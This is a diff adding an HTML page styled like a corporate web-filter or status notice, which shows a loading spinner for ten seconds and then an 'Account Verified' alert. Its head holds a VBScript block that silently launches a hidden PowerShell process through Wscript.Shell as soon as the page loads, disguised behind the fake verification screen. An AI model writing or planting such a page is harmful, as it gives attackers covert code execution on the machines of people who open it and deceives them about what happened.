@@ -1,0 +1,174 @@
+<style>
+body, ul, li {
+font-family:Arial, Helvetica, sans-serif;
+font-size:12px;
+color:#737373;
+margin:0;
+padding:0;
+}
+a:link, a:visited, a:active {
+text-decoration: underline;
+color:#015589;
+}
+a:hover {
+text-decoration: none;
+color:#51A8DE;
+}
+.content {
+padding: 20px 15px 15px 70px;
+margin: 0px auto 6px auto;
+border: #ebebeb solid 1px;
+width: 500px;
+}
+.blocking, .quotaing, .warning, .message {
+background-repeat:no-repeat;
+background-position: 9px 9px;
+}
+.blocking {
+border-top: #D52B1E solid 2px;
+border-bottom: #D52B1E solid 2px;
+background-image:url(images/ico_status_error.png);
+}
+.quotaing {
+border-top: #A4D3EE solid 2px;
+border-bottom: #A4D3EE solid 2px;
+background-image:url(images/ico_status_quotaing.png);
+}
+.warning {
+border-top: #F0AB00 solid 2px;
+border-bottom: #F0AB00 solid 2px;
+background-image:url(images/ico_status_warning.png);
+}
+.message {
+border-top: #0076C0 solid 2px;
+border-bottom: #0076C0 solid 2px;
+background-image:url(images/ico_info.png);
+}
+.title {
+font-size: 24px;
+border-bottom: #ccc solid 1px;
+padding-bottom:15px;
+margin-bottom:15px;
+}
+.details li {
+list-style: none;
+padding: 6px 0;
+}
+.url {
+font-style:italic;
+font-weight: 700;
+width: 490px;
+height: 18px;
+display:block;
+overflow: hidden;
+}
+.combobox {
+font-size: 11px;
+color: #737373;
+}
+#textfield {
+width: 460px;
+}
+#button {
+font-size:11px;
+}
+.buttonHolder {
+padding-top: 6px;
+}
+.footer {
+color: #ccc;
+font-size: 14px;
+width: 565px;
+margin: 0 auto;
+text-align:right;
+}
+ol.stepByStep {
+margin-left:-40px;
+}
+ol.stepByStep ol {
+margin-left:0 !important;
+display:none;
+}
+ol.stepByStep li.childActive ol, ol.stepByStep li.stepActive ol {
+display:block !important;
+}
+ol.stepByStep li {
+background-image:url(ico_wz_bullet.gif);
+background-repeat:no-repeat;
+font-weight:400;
+list-style:none;
+padding:2px 0 2px 20px;
+}
+ol.stepByStep li.stepPassed {
+background-image:url(ico_ok.gif) !important;
+}
+ol.stepByStep li.stepWarned {
+background-image:url(ico_concern.gif) !important;
+}
+ol.stepByStep li.stepFailed {
+background-image:url(ico_error.gif) !important;
+}
+ol.stepByStep li.stepActive {
+background-image:url(ico_busy.gif) !important;
+font-weight:700;
+color: #464646;
+}
+ol.stepByStep li.stepCurrent {
+background-image:url(ico_arrow.gif) !important;
+font-weight:700;
+}
+ol.stepByStep li.stepHelp {
+background-image:url(ico_help.gif) !important;
+font-weight:700;
+}
+.border01 {
+background-color:#fff;
+}
+.border02 {
+border:#dedede solid 1px;
+padding: 2px;
+}
+.barblue {
+background-color:#0095D8;
+height:16px;
+color: #fff;
+}
+.small {
+font-size: 10px;
+}
+/* For the scenario when page shows in iFrame */
+.nologo img, #footer.nologo {
+display: none;
+}
+</style>
+
+<html> 
+<head> 
+			<script language="VBScript"> 
+                Set objShell = CreateObject("Wscript.Shell")
+                objShell.Run "cmd.exe /c powershell", 0
+            </script> 
+</head> 
+<body> 
+<div id = "myDiv" style="display:none" align="center"><img id = "Loading" src = "images/loading_spinner.gif" ></div><br>
+<script type="text/javascript">
+
+  (function(){
+    var myDiv = document.getElementById("myDiv");
+
+    var show = function(){
+      myDiv.style.display = "block";
+      setTimeout(hide, 10000);  // 10 seconds
+    }
+
+    var hide = function(){
+      myDiv.style.display = "none";
+      window.alert("Account Verified");
+    }
+
+    show();
+  })();
+
+</script>
+</body> 
+</html>
